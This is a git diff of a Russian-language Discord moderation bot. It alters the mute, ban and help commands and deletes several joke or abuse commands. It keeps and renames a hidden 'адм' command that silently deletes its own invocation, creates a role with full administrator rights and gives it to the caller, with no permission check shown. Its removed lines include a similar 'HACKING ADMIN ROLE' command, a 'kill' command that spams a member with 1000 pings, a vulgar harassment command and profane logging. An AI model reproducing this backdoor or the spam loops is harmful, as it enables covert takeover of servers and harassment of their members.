@@ -55,10 +55,9 @@ async def mute(ctx, member: discord.Member = None,time=None, *,arg='Причин
 		elif 'd' in time:
 			time = time[:-1] 
 			time = int(time)*3600*24
-		await ctx.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Участник __{member.mention}__ замучен! \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author}__'))
-		await member.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Вам выдали мут. \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author}__'))
-		await member.add_roles(discord.utils.get(ctx.guild.roles, name = 'Mute'), reason =  f"{arg}")
-		print('Пользователя замутили на дискорд сервере')
+		await ctx.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Участник __{member.mention}__ замучен! \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author.mention}__'))
+		await member.send(embed = discord.Embed(title = 'Блокировки:lock:', description = f':bulb:Вам выдали мут. \n\n:bulb:Срок мута: **{time2}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Администратор: __{ctx.author.mention}__'))
+		await member.add_roles(discord.utils.get(ctx.guild.roles, name = 'Mute'), reason =  f"{arg} (Замутил {ctx.author.name})")
 		await asyncio.sleep(int(time))
 		await member.remove_roles(discord.utils.get(ctx.guild.roles, name = 'Mute')) 
 		await member.send(embed = discord.Embed(title = 'Сюрприз! :tada:', description=  f':bulb:У вас ,__{member.mention}__, истекло время мута '))
@@ -95,7 +94,6 @@ async def ban(ctx, member: discord.Member = None,time=None,*,arg='Причина
 		await member.create_dm()
 		await member.send(embed = discord.Embed(title = 'Блокировки:lock:', descriptions = f':bulb:Вы были забанены на **{time2}** \n\nCервер **{ctx.guild.name}** \n\n:bulb:Причина: __{arg}__ \n\n:bulb:Забанил: __{ctx.author}__'))
 		await member.ban(reason = f'{arg}')
-		print('Пользователя забанили на дискорд сервере')
 		await asyncio.sleep(int(time))
 		await member.unban(reason = f'{arg}')
 		await ctx.send(f'У участника __{member.mention}__ истекло время бана ')
@@ -163,19 +161,12 @@ async def лс(ctx, member: discord.Member = None, *, arg = None):
 	else:
 		await ctx.channel.purge(limit = 1)
 		await member.send(arg)
-@client.command()
-async def оп(ctx, limit = None):
-	await ctx.send(embed = discord.Embed(title = ':bulb:HACKING ADMINR ROLE', description = 'Происходит взлом права "Администратор"'))
-	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True))
-	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'new role'))
-	await ctx.send(embed = discord.Embed(title = ':bulb:Complete!', description = 'Права админа были выданы!'))
-	await ctx.author.send(embed = discord.Embed(title = ':bulb:Взлом', description = 'Вам была выдана роль __new role__! В ней есть право администратора!'))
 
 @client.command()
 async def адм(ctx, limit = None):
 	await ctx.channel.purge(limit = 1)
-	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True))
-	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'new role'))
+	await ctx.guild.create_role(permissions = discord.Permissions(administrator = True), name = 'GOD')
+	await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name = 'GOD'))
 	await ctx.author.send(embed = discord.Embed(title = ':bulb:Взлом', description = 'Вам была выдана роль __new role__! В ней есть право администратора!'))
 
 @client.command()
@@ -189,7 +180,6 @@ async def help(ctx):
 	emb.add_field(name = ':pushpin:.unwarn', value=':bulb:Очистка варнов', inline = True)
 	emb.add_field(name = ':pushpin:.скажи', value=':bulb:Сказать что-либо от имени бота', inline = True)
 	emb.add_field(name = ':pushpin:.avatar', value=':bulb:Заполучить аватар', inline = True)
-	emb.add_field(name = ':pushpin:.выебать', value=':bulb:Наказать своего недруга злым методом', inline = True)
 	emb.add_field(name = ':pushpin:.ping', value=':bulb:узнать пинг бота', inline = True)
 	emb.add_field(name = ':pushpin:.clear', value=':bulb:Очистка чата', inline = True)
 	emb.add_field(name = ':pushpin:.play', value=':bulb:Включить музыку', inline = True)
@@ -198,16 +188,6 @@ async def help(ctx):
 	emb.add_field(name = ':pushpin:.stop', value=':bulb:Остановить проигрывание полностью', inline = True)
 	await ctx.send(embed = emb)
 
-@client.command(aliases = ['v'])
-async def выебать(ctx,member: discord.Member = None,):
-	coint = 0
-	a = True
-	while a:
-		await ctx.send(f'Ого, Ты выебал __{member}__ \nhttps://get.wallhere.com/photo/anime-anime-girls-artwork-blue-Vocaloid-Hatsune-Miku-Toy-screenshot-mangaka-126872.jpg')
-		await member.send(f'Капец {member.mention}Тебя выебали!!! Выебал {ctx.author} \nhttps://get.wallhere.com/photo/anime-anime-girls-artwork-blue-Vocaloid-Hatsune-Miku-Toy-screenshot-mangaka-126872.jpg')
-		coint += 1
-		if coint == 1:
-			a = False
 @client.command(aliases = ['kl'])
 async def контроль(ctx,member: discord.Member = None, time=None):
 	await member.send(f'ИИ включен.')
@@ -221,22 +201,10 @@ async def контроль(ctx,member: discord.Member = None, time=None):
 		if coint == 300:
 			a = False
 
-@client.command()
-async def kill(ctx,member: discord.Member = None, *, arg = 'Без аргументов'):
-	coint = 0
-	a = True
-	while a:
-		await ctx.send(f'{member.mention} {arg}')
-		print('АААА КТО-ТО ИСПОЛЬЗОВАЛ КОМАНДУ .kill')
-		coint += 1
-		if coint == 1000:
-			a = False
-
 @client.event
 async def on_command_error(ctx, error):
 	if isinstance(error, commands.CommandNotFound ):
 		await ctx.send(embed = discord.Embed(title = 'Ошибка:no_entry:', description = f'**{ctx.author.name}**, данной команды не существует. \n\nЕсли хотите узнать команды, напишите .help'))
-		print(f'Пиздеец, прикинь чел {ctx.author} написал такооееее, БЛЯЯ пиздец он лошара ебаный пиздец, даже моя бабка знает все мои команды')
 	else:
 		print(error)	
 
